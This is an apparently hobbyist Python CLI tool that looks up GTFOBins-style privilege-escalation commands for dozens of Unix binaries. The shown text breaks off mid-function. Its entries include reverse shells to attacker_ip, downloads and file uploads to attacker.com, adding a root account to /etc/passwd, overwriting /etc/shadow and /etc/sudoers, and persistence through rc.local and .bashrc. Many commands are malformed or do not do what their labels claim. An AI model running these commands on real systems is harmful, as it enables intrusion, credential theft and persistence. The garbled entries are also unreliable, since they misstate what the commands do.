#Off-Grid written by S14X0r
#A GTFO Bins lookup tool for a CLI

def print_logo():
    logo = '''
 OOO   FFFFF  FFFFF    GGG   RRRR   III  DDDD  
O   O  F      F      G       R   R   I   D   D 
O   O  FFFF   FFFF   G  GG   RRRR    I   D   D 
O   O  F      F      G   G   R  R    I   D   D 
 OOO   F      F       GGG    R   R   III  DDDD  
    '''
    print(logo)
#Function for gtfo_bins that will hold the different commands and responses
def gtfo_bins(zip_command, zip_options):
    bins = []
    
    # Handle the 'zip' command with different options
    if zip_command == "zip":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #'rm $TF")
        elif zip_options == "file-read":
            bins.append("LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF'")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif zip_options == "file-write":
            bins.append("zip /tmp/archive.zip /tmp/* ")
    
    #Adding additional GTFO bins for other misconfigured binaries(there will be a lot)
    elif zip_command == "7zip":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -u) 7z x -so /etc/hosts | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif zip_options == "suid":
            bins.append("7z e /etc/hosts -o$TF; chmod +s $TF")
        elif zip_options == "file-write":
            bins.append("7z x malicious.zip -o/tmp")

    elif zip_command == "base64":
        if zip_options == "Shell":
            bins.append("echo 'base64 -d /etc/hosts' | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read base64 '$LFILE' | base64 --decode")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read sudo base64 '$LFILE' | base64 --decode")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_read ./base64 '$LFILE' | base64 --decode")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbase64 ""$LFILE"" | base64 --encode")

    elif zip_command == "bash":
        if zip_options == "Shell":
            bins.append("bash")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write bash -c 'echo DATA > $LFILE'")
        elif zip_options == "file-read":
            bins.append ("export LFILE=file_to_read bash -c 'echo '$(<$LFILE)''")
        elif zip_options == "sudo":
            bins.append("sudo bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bash) . ./bash -p")
    
    elif zip_command == "awk":
        if zip_options == "Shell":
            bins.append ("awk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read awk '//' ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo awk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which awk) . ./awk 'BEGIN {system(""/bin/sh"")}'")
        
    elif zip_command == "base32":
        if zip_options == "Shell":
             bins.append("echo 'base32 -d /etc/hosts' | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\n sudo base32 ""$LFILE"" | base32 --decode")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which base32) .\n LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
    
    elif zip_command == "busybox":
        if zip_options == "Shell":
            bins.append("busybox sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\n./busybox cat ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write busybox sh -c 'echo ""DATA"" > $LFILE'")
        elif zip_options == "sudo":
            bins.append("sudo busybox sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which busybox) .\n./busybox sh")
        
    elif zip_command == "cat":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo cat ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cat) .\nLFILE=file_to_read\n./cat ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncat ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("cat /etc/hosts")
        elif zip_options == "file-write":
            bins.append("echo 'malicious content' | cat > /etc/hosts\n")
            bins.append("echo 'malicious content' | cat > /etc/passwd\n")
            bins.append("echo 'malicious content' | cat > /etc/shadow\n")
            bins.append("echo 'malicious content' | cat > /etc/sudoers\n") 

    elif zip_command == "neofetch":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF")
        elif zip_options == "suid":
            bins.append("neofetch --command 'bash'") 
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nneofetch --ascii $LFILE")
        elif zip_options == "file-write":
            bins.append("echo ""Some content"" | tee /path/to/file")
        elif zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'exec /bin/sh' >$TF\n neofetch --config $TF")

    elif zip_command == "cp":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\necho ""DATA"" | sudo cp /dev/stdin ""$LFILE""")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_write\necho ""DATA"" | ./cp /dev/stdin ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("echo ""bash -i >& /dev/tcp/attacker_ip/4444 0>&1"" > /tmp/malicious.sh\ncp /tmp/malicious.sh /etc/rc.local")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncp ""$LFILE"" /dev/stdout")
        elif zip_options == 'file-write':
            bins.append("LFILE=file_to_write\necho ""DATA"" | cp /dev/stdin ""$LFILE""")
        
    elif zip_command == "curl":
        if zip_options == "sudo":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE")
        elif zip_options == "suid":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl ""file://$TF"" -o ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=/tmp/file_to_read\ncurl file://$LFILE")
        elif zip_options == "Shell":
            bins.append("curl -sL http://attacker_ip/malicious.sh > /etc/rc.local")

    elif zip_command == "chmod":
        if zip_options == "Shell":
            bins.append('echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/reverse_shell.sh\nchmod u+s /tmp/reverse_shell.sh')
        elif zip_options == "sudo":
            bins.append('LFILE=file_to_change\nsudo chmod 6777 $LFILE')
        elif zip_options == "suid":
            bins.append("LFILE=file_to_change\n./chmod 6777 $LFILE")
        elif zip_options == "file-write":
            bins.append("echo ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")
        elif zip_options == "file-read":
            bins.append("chmod 644 /var/log/auth.log")
#Ignore the warning for the dosbox options when running the program! 
    elif zip_command == "dosbox":
        if zip_options == "file-write":
            bins.append("LFILE='\path\ to\ file_to_write'\ndosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif zip_options == "file-read":
            bins.append("LFILE='\path\ to\ file_to_read'\ndosbox -c 'mount c /' -c ""type c:$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE='\path\ to\ file_to_write'\nsudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif zip_options == "suid":
            bins.append("LFILE='\path\ to\ file_to_write'\n./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"": -c exit")
        elif zip_options == "Shell":
            bins.append("Shell not available, please choose other options.")
            
    elif zip_command == "dmesg":
        if zip_options == "Shell":
            bins.append("dmesg -H\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo dmesg -H\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndmesg -rF ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("dmesg > /var/log/syslog")
        elif zip_options == "suid":
            bins.append("dmesg >> /etc/passwd\necho ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")

    elif zip_command == "gcc":
        if zip_options == "Shell":
            bins.append("gcc -wrapper /bin/sh,-s ")
        elif zip_options == "sudo":
            bins.append("sudo gcc -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngcc -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("Run the sudo option!")
    
    elif zip_command == "vim" or zip_command == "vi":
        if zip_options == "Shell":
            bins.append("vim -c ':!/bin/sh'")
        elif zip_options == "sudo":
            bins.append("sudo vim -c ':!/bin/sh'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which vim) .\n./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'")
        elif zip_options == "file-write":
            bins.append("vim file_to_write\niDATA\n^[\nw")
        elif zip_options == "file-read":
            bins.append("vim file_to_read")

    elif zip_command == "nano":
        if zip_options == "Shell":
            bins.append("nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif zip_options == "sudo":
            bins.append("sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif zip_options == "suid":
            bins.append("./nano -s /bin/sh\n/bin/sh\n^T")
        elif zip_options == "file-write":
            bins.append("nano file_to_write\nDATA\n^O")
        elif zip_options == "file-read":
            bins.append("nano file_to_read")

    elif zip_command == "zsh":
        if zip_options == "Shell":
            bins.append("zsh")
        elif zip_options == "sudo":
            bins.append("sudo zsh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which zsh) .\n./zsh")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\nzsh -c 'echo ""$(<$LFILE)""'")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'")

    elif zip_command == "dd":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\necho ""data"" | sudo dd of=$LFILE	")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dd) .\nLFILE=file_to_write\necho ""data"" | ./dd of=$LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\necho ""DATA"" | dd of=$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndd if=$LFILE")

    elif zip_command == "aa-exec":
        if zip_options == "Shell":
            bins.append("aa-exec /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo aa-exec /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aa-exec) .\n./aa-exec /bin/sh -p")
        elif zip_options == "file-read":
            bins.append("aa-exec -p /etc/apparmor.d/usr.bin.cat cat /etc/passwd")
        elif zip_options == "file-write":
            bins.append("aa-exec -p /etc/apparmor.d/usr.bin.tee echo ""This is some text"" | tee /tmp/output.txt")

    elif zip_command == "ab":
        if zip_command == "sudo":
            bins.append("URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL")
        elif zip_options == "suid":
            bins.append("URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL")
        elif zip_options == "Shell":
            bins.append("Shell not available, please use other command.")
        elif zip_options == "file-write":
            bins.append("Downloads -> URL=http://attacker.com/file_to_download\nab -v2 $URL")
        elif zip_options == "file-read":
            bins.append("Uploads -> URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL")

    elif zip_command == "agetty":
        if zip_options == "Shell":
            bins.append("agetty --noclear tty1 /bin/bash")
        elif zip_options == "sudo":
            bins.append("sudo /sbin/agetty --noclear tty1 /bin/bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which agetty) .\n./agetty -o -p -l /bin/sh -a root tty")
        elif zip_options == "file-write":
            bins.append("sudo /sbin/agetty --noclear tty1 /bin/bash -c ""echo 'malicious data' > /tmp/malicious_file.txt""")
        elif zip_options == "file-read":
            bins.append("/sbin/agetty --noclear tty1 /bin/cat /etc/shadow")

    elif zip_command == "alpine":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo alpine -F ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which alpine) .\nLFILE=file_to_read\n./alpine -F ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nalpine -F ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("'sudo alpine --exec ""echo 'malicious data' > /tmp/malicious_file.txt""'")
        elif zip_options == "Shell":
            bins.append("sudo alpine -command ""/bin/bash""")

    elif zip_command == "ansible-playbook":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'" >$TF\nansible-playbook $TF")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'" >$TF\nsudo ansible-playbook $TF")
        elif zip_options == "file-read":
            bins.append("sudo ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")
        elif zip_options == "file-write":
            bins.append("sudo ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")
        elif zip_options == "suid":
            bins.append("ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")

    elif zip_command == "ansible-test":
        if zip_options == "Shell":
            bins.append("ansible-test shell")
        elif zip_options == "sudo":
            bins.append("sudo ansible-test shell")
        elif zip_options == "suid":
            bins.append("ansible-test run -v -e ""file=/etc/passwd"" -m debug")
        elif zip_options == "file-write":
            bins.append("""echo 'malicious_command' >> ~/.bashrc""")
        elif zip_options == "file-read":
            bins.append("ansible-test -i localhost, -c local -e ""file=/etc/shadow"" -m debug")

    elif zip_command == "aoss":
        if zip_options == "Shell":
            bins.append("aoss /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo aoss /bin/sh")
        elif zip_options == "suid":
            bins.append("aoss echo ""malicious_command"" >> ~/.bashrc")
        elif zip_options == "file-write":
            bins.append("aoss /bin/bash -c 'echo ""Malicious content"" > /tmp/output.txt'")
        elif zip_options == "file-read":
            bins.append("aoss /bin/bash -c 'cat /etc/passwd'")
    
    elif zip_command == "apache2ctl":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo apache2ctl -c ""Include $LFILE"" -k stop")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\n apache2ctl -c ""Include $LFILE"" -k stop")
        elif zip_options == "file-write":
            bins.append("apache2ctl -S 2>&1 | tee /tmp/malicious_output.txt")
        elif zip_options == "Shell":
            bins.append("apache2ctl -S; /bin/bash")
        elif zip_options == "suid":
            bins.append("apache2ctl -S; /bin/bash -c 'id'")

    elif zip_command == "apt-get" or zip_command == "apt":
        if zip_options == "Shell":
            bins.append("apt-get changelog apt\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo apt-get changelog apt\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("apt-get install -y /bin/bash")
        elif zip_options == "file-write":
            bins.append("echo '/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1' > /tmp/reverse_shell.sh")
        elif zip_options == "file-read":
            bins.append("apt-get -qq list | grep -i 'package_name'")

    elif zip_command == "ar":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ar) .\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -u)\nLFILE=file_to_read\nar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp)\nLFILE=/path/to/sensitive/file\nar r ""$TF"" ""$LFILE""\nmv ""$TF"" /path/to/destination/file_to_write\ncat ""$TF""")
        elif zip_options == "Shell":
            bins.append("ar rcs libexample.a file1.o file2.o; bash")

    elif zip_command == "aria2c":
        if zip_options == "sudo":
            bins.append("COMMAND='id'\nTF=$(mktemp)\necho ""$COMMAND"" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aria2c) .COMMAND='id'\nTF=$(mktemp)\necho ""$COMMAND"" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x")
        elif zip_options == "Shell":
            bins.append("aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa")
        elif zip_options == "file-read":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o ""$LFILE""" "$URL""")
        elif zip_options == "file-write":
            bins.append("aria2c -d /path/to/directory -o filename.extension ""http://example.com/file""")

    elif zip_command == "arj":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\nsudo arj e ""$TF/a"" $LDIR")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which arj) .\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\nsudo arj e ""$TF/a"" $LDIR")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\narj e ""$TF/a"" $LDIR")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -u)\nLFILE=file_to_read\narj a ""$TF"" ""$LFILE""\narj p ""$TF""")
        elif zip_options == "Shell":
            bins.append("arj a archive.arj file1 file2 directory")
    
    elif zip_command == "arp":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\narp -v -f ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo arp -v -f ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which arp) .\nLFILE=file_to_read\nsudo arp -v -f ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("arp -s 127.0.0.1 00:00:00:00:00:01 && bash -i")
        elif zip_options == "file-write":
            bins.append('arp -s 127.0.0.1 00:00:00:00:00:01 | tee /tmp/arp_output.txt')

    elif zip_command == "as":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo as @$LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which as) .\nLFILE=file_to_read\n./as @$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nas @$LFILE")
        elif zip_options == "Shell":
            bins.append("as -o shell.o shell.asm")
        elif zip_options == "file-write":
            bins.append("as -o /tmp/shell.o write_shell.asm")

    elif zip_command == "ascii-xfr":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo ascii-xfr -ns ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nascii-xfr -ns ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ascii-xfr) .\nLFILE=file_to_read\nascii-xfr -ns ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("python -c 'import socket, subprocess, os; s=socket.socket(); s.connect((\"attacker_ip\", 1234)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/sh\", \"-i\"]);'")
        elif zip_options == "file-write":
            bins.append("echo ""<your transferred ASCII payload>"" > /tmp/reverse_shell.sh\nchmod +x /tmp/reverse_shell.sh\ncd /tmp\n./reverse_shell.sh")

    elif zip_command == "ascii85":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo ascii85 ""$LFILE"" | ascii85 --decode")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nascii85 ""$LFILE"" | ascii85 --decode")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nascii85 ""$LFILE"" | ascii85 --encode")
        elif zip_options == "Shell":
            bins.append("ascii85 -d reverse_shell_ascii85.txt > reverse_shell.sh\nchmod +x reverse_shell.sh\n./reverse_shell.sh")
        elif zip_options == "suid":
            bins.append("ascii85 /etc/shadow > shadow_ascii85.txt\nascii85 -d shadow_ascii85.txt > decoded_shadow.txt\n")

    elif zip_command == "ash":
        if zip_options == "Shell":
            bins.append("ash")
        elif zip_options == "sudo":
            bins.append("sudo ash")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ash) .\n./ash")
        elif zip_options == "file-read":
            bins.append("find / -type f -perm -4000 2>/dev/null")

    elif zip_command == "aspell":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo aspell -c ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\naspell -c ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aspell) .\nLFILE=file_to_read\naspell -c ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("aspell -c /etc/shadow")
        elif zip_options == "file-write":
            bins.append("aspell -d /usr/share/dict/words > /tmp/root_written_file.txt")

    elif zip_command == "at":
        if zip_options == "Shell":
            bins.append("echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null")
        elif zip_options == "sudo":
            bins.append("echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null")
        elif zip_options == "file-write":
            bins.append("COMMAND=id\necho ""$COMMAND"" | at now\n")
        elif zip_options == "file-read":
            bins.append("echo ""cat /etc/shadow"" | at now")
        elif zip_options == "suid":
            bins.append("ls -l $(which at)\necho ""cat /etc/passwd > /tmp/passwd_output.txt"" | at now")

    elif zip_command == "atobm":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which atobm) .\natobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif zip_options == "file-write":
            bins.append("sudo chown <your-username>:<your-group> <file-path>")
        elif zip_options == "Shell":
            bins.append("Shell not available")

    elif zip_command == "aws":
        if zip_options == "Shell":
            bins.append("aws help\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo aws help\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("aws s3 cp s3://bucket-name/file.txt .")
        elif zip_options == "file-write":
            bins.append("aws s3 cp /local/directory s3://your-bucket-name/directory --recursive")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aws) .\naws help\n!/bin/sh")

    elif zip_command == "base58":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo base58 ""$LFILE"" | base58 --decode")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbase58 ""$LFILE"" | base58 --decode")
        elif zip_options == "file-write":
            bins.append("python -c ""import base58; f = open('/path/to/outputfile', 'w'); f.write(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx').decode('utf-8')); f.close()""")
        elif zip_options == "suid":
            bins.append("python -c ""import base58; exec(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx'))""")
        elif zip_options == "Shell":
            bins.append("python -c ""import base58; exec(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx'))""")

    elif zip_command == "basenc":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which basenc) .\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbasenc --base64 $LFILE | basenc -e --base64")
        elif zip_options == "Shell":
            bins.append("echo ""/bin/bash -i"" | base64")

    elif zip_command == "basez":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo basez ""$LFILE"" | basez --decode")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which basez) .\nLFILE=file_to_read\nsudo basez ""$LFILE"" | basez --decode")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbasez ""$LFILE"" | basez --decode")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbasez ""$LFILE"" | basez --encode")
        elif zip_options == "Shell":
            bins.append("echo ""/bin/bash -i"" | base64")

    elif zip_command == "batcat":
        if zip_options == "Shell":
            bins.append("batcat --paging always /etc/profile\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo batcat --paging always /etc/profile\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which batcat) .\n./batcat --paging always /etc/profile\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("batcat /path/to/file")
        elif zip_options == "file-write":
            bins.append("echo ""Injected content"" | batcat > /path/to/file")

    elif zip_command == "bc":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo bc -s $LFILE\nquit")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbc -s $LFILE\nquit")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bc) .\nLFILE=file_to_read\n./bc -s $LFILE\nquit")
        elif zip_options == "Shell":
            bins.append("echo 'system(""sh"")' | bc")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbc -s $LFILE\nquit")

    elif zip_command == "bconsole":
        if zip_options == "Shell":
            bins.append("bconsole\n@exec /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo bconsole\n@exec /bin/sh")
        elif zip_options == "file-read":
            bins.append("bconsole -c /etc/shadow")
        elif zip_options == "file-write":
            bins.append("bconsole -c /path/to/destination")
        elif zip_options == "suid":
            bins.append("./bconsole\n@exec /bin/sh")

    elif zip_command == "bpftrace":
        if zip_options == "sudo":
            bins.append("sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'")
        elif zip_options == "Shell":
            bins.append("bpftrace -c /bin/sh -e 'END {exit()}'")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp)\necho 'BEGIN {system(""/bin/sh"");exit()}' >$TF\nbpftrace $TF")
        elif zip_options == "file-write":
            bins.append("bpftrace -e 'tracepoint=syscalls:sys_enter_write /comm == ""your_program_name""/ { printf(""PID %d wrote %d bytes to fd %d\n"", pid, args->count, args->fd); }'")
        elif zip_options == "file-read":
            bins.append("bpftrace -e 'tracepoint=syscalls:sys_enter_read { printf(""PID %d read %d bytes\n"", pid, args->count); }' > file_reads.txt")

    elif zip_command == "bridge":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo bridge -b ""$LFILE""")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_read\n./bridge -b ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbridge -b ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("sudo brctl addbr br0\nsudo brctl addif br0 eth0")
        elif zip_options == "Shell":
            bins.append("username ALL=(ALL) NOPASSWD: /usr/sbin/bridge")

    elif zip_command == "bundle":
        if zip_options == "Shell":
            bins.append("bundle help\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo bundle help\n!/bin/sh")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh")
        elif zip_options == "suid":
            bins.append("export BUNDLE_GEMFILE=x\nbundle exec /bin/sh")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/Gemfile\ncd $TF\nbundle install")

    elif zip_command == "bundler":
        if zip_options == "sudo":
            bins.append("sudo bundler help\n!/bin/sh")
        elif zip_options == "Shell":
            bins.append("bundler help\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("export BUNDLE_GEMFILE=x\nbundler exec /bin/sh")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/Gemfile\ncd $TF\nbundler install")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh")

    elif zip_command == "busctl":
        if zip_options == "Shell":
            bins.append("busctl --show-machine\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'")
        elif zip_options == "suid":
